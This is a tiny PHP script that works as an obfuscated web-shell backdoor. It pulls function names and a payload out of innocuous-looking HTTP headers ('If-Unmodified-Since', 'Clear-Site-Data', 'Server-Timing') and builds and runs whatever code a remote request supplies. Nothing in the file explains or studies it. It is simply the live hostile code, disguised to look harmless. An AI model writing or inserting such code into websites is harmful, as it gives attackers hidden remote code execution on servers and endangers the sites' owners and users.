<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $accept = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Server-Timing']));
    $accept();
}